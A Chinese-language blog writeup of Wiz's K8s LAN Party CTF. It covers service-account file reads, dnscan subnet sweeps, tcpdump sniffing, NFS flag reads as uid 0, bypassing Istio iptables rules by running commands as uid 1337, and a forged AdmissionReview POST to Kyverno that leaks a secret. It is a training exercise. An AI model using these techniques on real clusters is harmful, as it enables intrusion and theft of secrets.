---
layout: post
title:  k8s lan party ctf writeup
tags: [news,tech,k8s]
---

学习k8s安全的技巧，看到最近拒绝谷歌230亿美元收购的Wiz公司之前出的一套CTF题目，[k8s lan party](https://www.wiz.io/blog/k8s-lan-party-challenge)，文章中说是一些实际经验总结的题目，因此决定做一下。
CTF地址：https://k8slanparty.com/ 

## RECON
题目中给的链接是怎么发现dns和服务。按照博客中的域名格式，手动构造了几个地址，没有多少思路。  
获取namespace  
`cat /var/run/secrets/kubernetes.io/serviceaccount/namespace `  

获取ip  
`ls .kube/cache/discovery/`  
补充：从其他writeup中发现可以使用env命令获取

扫描  
`dnscan -subnet (last step ip)/16`  
获取到ip之后，就是一顿狂扫。  

获取flag  
`curl (dns name from last scan).svc.cluster.local.`  
最终获取flag，纯属意外，对这个ctf没有思路。以为是要使用kubectl命令来做。

## Finding neighbours
题目中说是sidecar，各种尝试之后，使用tcpdump抓包，看到一个post到reporting的请求。  
抓包  
`tcpdump -v`  
flag在post数据包中。

## Data leakage
这道题卡了很久，最终使用了hint，加网上的writeup。  
刚开始在目录下查看各种文件，发现flag.txt，但是没有查看权限。  
```
player@wiz-k8s-lan-party:~$ ls -la /efs/
total 8
drwxr-xr-x 2 root   root   6144 Mar 11 11:43 .
drwxr-xr-x 1 player player   51 Apr 25 11:24 ..
---------- 1 daemon daemon   73 Mar 11 13:52 flag.txt
```
根据题目中的过时的云服务和efs关键词搜索，还以为是要找aws efs的漏洞来利用，但是没有apt install的权限，一些包没法安装。  

接着就是一顿dnscan扫描，以及nmap扫描，找到一个ip开了2049端口，在这个ip上试了好一会，结果最后不是这个ip。

搞了半天之后，因为权限问题也mount不上，看了两个hint，还是没有成功接出来。网上找了一篇writeup，发现`mount | grep nfs`之后，可以拿到正确的ip，接下来就可以使用`nfs-cat "nfs://(ip)//flag.txt?version=4&uid=0&gid=0"`读取flag.txt
一直错误是因为我们一直在尝试读取的ip不对。

## Bypassing boundaries
这个题目有点像绕waf的题目，根据前面几道题目的经验，先dnscan一顿狂扫，
```
dnscan -subnet 10.100.0.1/16

10.100.224.159 istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
```
找到一个服务，看题目中是GET和POST拦截，就尝试用HEAD关键词来访问，没有啥有用信息。  
nmap扫描一下。
`su - player -c 'nmap istio-protected-pod-service.k8s-lan-party.svc.cluster.local'`  

还是没有思路，看hint，让看iptables，看到文章中给的命令是获取一个pid的iptables，然后去找pid，方向找错了。  
继续看hint，`Try executing "cat /etc/passwd | grep 1337", to find the user that can bypass the Istio's IPTables rules`  
然后去文章中看了一下，
```
1337 - uid and gid used to distinguish between traffic originating from proxy vs the applications.
127.0.0.6 -- InboundPassthroughBindIpv4. When Istio-proxy passes through an inbound connection to the local workload using the original destination IP (ORIGINAL_DST), it uses this source ip address. Iptables rules use this source ip to avoid redirection back to the proxy on the output chain.
```
最终命令，跟web绕waf思路还是不一样的  
`su - istio -c 'curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local'`

## Lateral movement
先是一顿狂扫
```
player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.1/16

22169 / 65536 [------------------------------------------------------------>_______________________________________________________________________________________________________________________] 33.83% 990 p/s10.100.86.210 kyverno-cleanup-controller.kyverno.svc.cluster.local.
32267 / 65536 [---------------------------------------------------------------------------------------->___________________________________________________________________________________________] 49.24% 990 p/s10.100.126.98 kyverno-svc-metrics.kyverno.svc.cluster.local.
40590 / 65536 [--------------------------------------------------------------------------------------------------------------->____________________________________________________________________] 61.94% 990 p/s10.100.158.213 kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
43752 / 65536 [------------------------------------------------------------------------------------------------------------------------>___________________________________________________________] 66.76% 990 p/s10.100.171.174 kyverno-background-controller-metrics.kyverno.svc.cluster.local.
55630 / 65536 [-------------------------------------------------------------------------------------------------------------------------------------------------------->___________________________] 84.88% 990 p/s10.100.217.223 kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
59192 / 65536 [------------------------------------------------------------------------------------------------------------------------------------------------------------------>_________________] 90.32% 990 p/s10.100.232.19 kyverno-svc.kyverno.svc.cluster.local.
65321 / 65536 [----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->] 99.67% 989 p/s10.100.86.210 -> kyverno-cleanup-controller.kyverno.svc.cluster.local.
10.100.126.98 -> kyverno-svc-metrics.kyverno.svc.cluster.local.
10.100.158.213 -> kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
10.100.171.174 -> kyverno-background-controller-metrics.kyverno.svc.cluster.local.
10.100.217.223 -> kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
10.100.232.19 -> kyverno-svc.kyverno.svc.cluster.local.
```
各种尝试之后，需要尝试发post包，由于官方链接里面没有给怎么生成json格式的数据，因此让chatglm来生成一段post data，后面把题目中的数据也作为上下文提供，这也为后面做的不对埋下伏笔，因为生成的post包，大部分是对的，但是少了几个字段，所以最终没有成功。  
看了hint之后，Chatglm也给出了正确的api，不过最后的包还是从网络上找的writeup，对比之后，才发现一直少字段，所以不行。  

hint  
```
https://github.com/anderseknert/kube-review


This exercise consists of three ingredients: kyverno's hostname (which can be found via dnscan), the relevant HTTP path (which can be found in Kyverno's source code) and the AdmissionsReview request.
```

需要使用https进行访问，返回包提取字符串，base64解码。原理部分，可以参考其他writeup。
```
curl -k -X POST \
  https://kyverno-svc.kyverno.svc.cluster.local/mutate \
  -H 'Content-Type: application/json' \
  -d '{
  "apiVersion": "admission.k8s.io/v1",
  "kind": "AdmissionReview",
  "request": {
    "uid": "705ab4f5-6393-11e9-b132-0a580a2c0d25",
    "kind": {
      "group": "",
      "version": "v1",
      "kind": "Pod"
    },
    "resource": {
      "group": "",
      "version": "v1",
      "resource": "pods"
    },
    "requestKind": {
      "group": "",
      "version": "v1",
      "kind": "Pod"
    },
    "requestResource": {
      "group": "",
      "version": "v1",
      "resource": "pods"
    },
    "namespace": "sensitive-ns",
    "operation": "CREATE",
    "userInfo": {
      "username": "system:serviceaccount:kube-system:replicaset-controller",
      "uid": "b7956f2e-6393-11e9-b132-0a580a2c0d25",
      "groups": [
        "system:serviceaccounts",
        "system:serviceaccounts:kube-system",
        "system:authenticated"
      ]
    },
    "object": {
      "apiVersion": "v1",
      "kind": "Pod",
      "metadata": {
        "name": "example-pod",
        "namespace": "sensitive-ns",
        "labels": {
          "app": "example"
        }
      },
      "spec": {
        "containers": [
          {
            "name": "example-container",
            "image": "nginx:latest",
            "env": [
              {
                "name": "FLAG",
                "value": "{flag}"
              }
            ]
          }
        ]
      }
    },
    "oldObject": null,
    "dryRun": true,
    "options": {
      "kind": "CreateOptions",
      "apiVersion": "meta.k8s.io/v1"
    }
  }
}'
```

# 总结
整体感受是，没有思路的话，会有点摸不着头脑。跟想象的k8s ctf还不一样，因为没有多少k8s命令。基本上是先来一顿狂扫，发现目标，之后想办法获取信息，并且需要hint提示。  
不过实战大多也是如此，真正神来之笔还是少数。

